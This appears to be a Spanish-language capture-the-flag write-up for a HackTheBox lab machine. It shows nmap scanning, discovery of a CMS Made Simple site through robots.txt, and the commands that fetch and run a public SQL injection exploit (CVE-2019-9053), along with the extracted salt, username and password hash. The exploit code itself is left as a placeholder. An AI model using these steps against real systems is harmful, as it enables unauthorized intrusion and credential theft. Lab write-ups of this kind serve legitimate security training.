# 🕵️‍♂️ Reconocimiento

Comenzamos con el escaneo de puertos utilizando `nmap`:

```bash
nmap -p- --open -sS -Pn -vvv -n --min-rate 5000 10.10.10.138 -oG allports
nmap -sCV -p80,22 10.10.10.138
```

![[Writeup1.png]]

El resultado indica que los puertos **22 (SSH)** y **80 (HTTP)** están abiertos.  
Esto nos permite acceder a:

- Página principal: [http://10.10.10.138/](http://10.10.10.138/)
- Archivo `robots.txt`: [http://10.10.10.138/robots.txt](http://10.10.10.138/robots.txt)

Al entrar a la página principal vemos que tiene una protección anti-DDoS que bloquea la enumeración.  
Probamos fuzzing con `ffuf` y `gobuster`, pero no obtuvimos resultados útiles.

![[Writeup2.png]]

Sin embargo, al ingresar a `robots.txt` encontramos una ruta interesante:

- [http://10.10.10.138/writeup/](http://10.10.10.138/writeup/)

![[Writeup3.png]]

Al inspeccionar el código fuente del sitio `/writeup`, vemos que el CMS utilizado es **CMS Made Simple**.  
El pie de página indica un copyright de 2004–2019, lo que sugiere que podría estar usando una versión antigua (potencialmente vulnerable).

![[Writeup4.png]]

---

# 🔍 Búsqueda de vulnerabilidades

Buscamos en `searchsploit`:

```bash
searchsploit CMS Made Simple
```

Encontramos una vulnerabilidad de **inyección SQL no autenticada** en la versión **2.2.10** (CVE-2019-9053).

![[Writeup5.png]]

La copiamos con:

```bash
searchsploit -m php/webapps/46635.py
```

Al ejecutar el exploit en **Python 2.7** tuvimos errores con el módulo `termcolor`, así que convertimos el script a **Python 3** usando ChatGPT.

---

# 🐍 Exploit en Python 3

Guardamos el siguiente código como `exploit.py`:

```python
# (Pegar aquí el código completo convertido a Python 3 que ya tenés)
```

Ejecutamos el script con:

```bash
python3 exploit.py -u http://10.10.10.138/writeup/ -w /usr/share/wordlists/rockyou.txt
```

> El parámetro `-u` es para la URL objetivo y `-w` es para el diccionario de palabras.  
> Tuvimos que modificar la variable `TIME = 1` a `TIME = 2` para evitar falsos positivos.

![[Writeup6.png]]

---

# 🧂 Resultado del exploit

El exploit extrae la siguiente información:

```
[+] Salt for password found: 5a599ef579066807
[+] Username found: jkr
[+] Email found: jkr@writeup.htb
[+] Password found: 62def4866937f08cc13bab43bb14e6f7
```

---

# 📚 Créditos

Se utilizó ayuda de los siguientes recursos:

- [Video oficial de la máquina](https://www.youtube.com/watch?v=sG7_MYqAcu0)
- Writeup en PDF de HackTheBox:  
  `file:///C:/Users/guido/Downloads/Writeup-2.pdf`
